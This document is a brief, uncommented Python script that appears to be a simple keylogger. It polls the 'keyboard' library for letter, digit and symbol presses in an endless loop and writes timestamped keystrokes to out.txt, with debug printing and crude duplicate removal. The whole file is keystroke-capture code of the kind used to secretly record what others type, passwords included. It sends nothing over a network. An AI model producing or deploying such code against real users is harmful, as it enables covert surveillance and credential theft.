import time
import keyboard

OUT = "out.txt"

char = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1' ,'2' ,'3' ,'4' ,'5' ,'6' ,'7' ,'8' ,'9' ,'~', ':', "'", '+', '[', '\\', '@', '^', '{', '%', '(', '-', '"', '*', '|',
',', '&', '<', '`', '}', '.', '_', '=', ']', '!', '>', ';', '?', '#','$', ')', '/', ' ']
temp = []


while True:
    for i in char:
        if keyboard.is_pressed(i):
            with open(OUT, "w") as output:
                pressed = (f"{time.ctime()} - {i}\n")
                temp.append(pressed)
                for i, j in enumerate(temp):
                    print(temp[i])
                    print(temp[i - 1])
                    if temp[i - 1] == temp[i]:
                        temp.pop(i)
                output.write(''.join(temp))